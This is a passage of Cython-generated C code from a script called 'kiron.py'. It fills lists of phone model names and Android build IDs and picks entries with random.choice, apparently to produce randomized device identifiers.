  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 125, __pyx_kp_s_Redmi_Note_Prime)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note10);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note10);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 126, __pyx_kp_s_Redmi_Note10)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note10T);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note10T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 127, __pyx_kp_s_Redmi_Note10T)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note7);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 128, __pyx_kp_s_Redmi_Note7)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note8);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 129, __pyx_kp_s_Redmi_Note8)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note8T);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note8T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 130, __pyx_kp_s_Redmi_Note8T)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note9);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 131, __pyx_kp_s_Redmi_Note9)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Pad);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Pad);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 132, __pyx_kp_s_Redmi_Pad)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 133, __pyx_kp_s_Redmi_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_S2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_S2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 134, __pyx_kp_s_Redmi_S2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_X);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 135, __pyx_kp_s_Redmi_X)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 136, __pyx_kp_s_Redmi_Y1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 137, __pyx_kp_s_Redmi_Y1_Lite)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 138, __pyx_kp_s_Redmi_Y2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 139, __pyx_kp_s_Redmi_Y3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 140, __pyx_kp_s_Redmi_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 141, __pyx_kp_s_Redmi_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_3S);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_3S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 142, __pyx_kp_s_Redmi_3S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 143, __pyx_kp_s_Redmi_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4A);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 144, __pyx_kp_s_Redmi_4A)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4X);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 145, __pyx_kp_s_Redmi_4X)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 146, __pyx_kp_s_Redmi_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 147, __pyx_kp_s_Redmi_5_Plus)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5A);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 148, __pyx_kp_s_Redmi_5A)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_6);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 149, __pyx_kp_s_Redmi_6)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 150, __pyx_kp_s_Redmi_Note)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 151, __pyx_kp_s_Redmi_Note_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 152, __pyx_kp_s_Redmi_Note_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_4X);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_4X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 153, __pyx_kp_s_Redmi_Note_4X)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 154, __pyx_kp_s_Redmi_Note_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 155, __pyx_kp_s_Redmi_Note_5_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5A);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 156, __pyx_kp_s_Redmi_Note_5A)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5A_Prime);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5A_Prime);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 157, __pyx_kp_s_Redmi_Note_5A_Prime)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_S2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_S2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 158, __pyx_kp_s_Redmi_S2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 159, __pyx_kp_s_Redmi_Y1)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 160, __pyx_kp_s_Redmi_Y1_Lite)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 161, __pyx_kp_s_Redmi_Y2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_60);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_60);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 162, __pyx_kp_s_Rex_60)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_80);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_80);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 163, __pyx_kp_s_Rex_80)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Rhyme);
  __Pyx_GIVEREF(__pyx_n_s_Rhyme);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 164, __pyx_n_s_Rhyme)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_RM_560);
  __Pyx_GIVEREF(__pyx_kp_s_RM_560);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 165, __pyx_kp_s_RM_560)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Ruby);
  __Pyx_GIVEREF(__pyx_n_s_Ruby);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 166, __pyx_n_s_Ruby)) __PYX_ERR(0, 337, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 337, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_v_mmp = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":338
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 *      mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])             # <<<<<<<<<<<<<<
 *      bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
 *      kkkkki = random.choice(['RMX2185','RMX2085','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(52); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Ruby);
  __Pyx_GIVEREF(__pyx_n_s_Ruby);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Ruby)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V10_AT_T);
  __Pyx_GIVEREF(__pyx_kp_s_V10_AT_T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_V10_AT_T)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V10_T_Mobile);
  __Pyx_GIVEREF(__pyx_kp_s_V10_T_Mobile);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_V10_T_Mobile)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V10_Verizon);
  __Pyx_GIVEREF(__pyx_kp_s_V10_Verizon);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_V10_Verizon)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V1Max);
  __Pyx_GIVEREF(__pyx_n_s_V1Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 4, __pyx_n_s_V1Max)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V20);
  __Pyx_GIVEREF(__pyx_n_s_V20);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 5, __pyx_n_s_V20)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V20_AT_T);
  __Pyx_GIVEREF(__pyx_kp_s_V20_AT_T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_V20_AT_T)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V20_Sprint);
  __Pyx_GIVEREF(__pyx_kp_s_V20_Sprint);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_V20_Sprint)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V20_T_Mobile);
  __Pyx_GIVEREF(__pyx_kp_s_V20_T_Mobile);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_V20_T_Mobile)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V20_Verizon);
  __Pyx_GIVEREF(__pyx_kp_s_V20_Verizon);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 9, __pyx_kp_s_V20_Verizon)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V3);
  __Pyx_GIVEREF(__pyx_n_s_V3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 10, __pyx_n_s_V3)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V5);
  __Pyx_GIVEREF(__pyx_n_s_V5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 11, __pyx_n_s_V5)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V5s);
  __Pyx_GIVEREF(__pyx_n_s_V5s);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 12, __pyx_n_s_V5s)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V7);
  __Pyx_GIVEREF(__pyx_n_s_V7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 13, __pyx_n_s_V7)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_V7_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_V7_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 14, __pyx_kp_s_V7_Plus)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V808);
  __Pyx_GIVEREF(__pyx_n_s_V808);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 15, __pyx_n_s_V808)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_V9);
  __Pyx_GIVEREF(__pyx_n_s_V9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 16, __pyx_n_s_V9)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Valencia);
  __Pyx_GIVEREF(__pyx_n_s_Valencia);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 17, __pyx_n_s_Valencia)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vdeo_2);
  __Pyx_GIVEREF(__pyx_kp_s_Vdeo_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 18, __pyx_kp_s_Vdeo_2)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vega_Iron_2_WiFi);
  __Pyx_GIVEREF(__pyx_kp_s_Vega_Iron_2_WiFi);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 19, __pyx_kp_s_Vega_Iron_2_WiFi)) __PYX_ERR(0, 338, __pyx_L1_error);
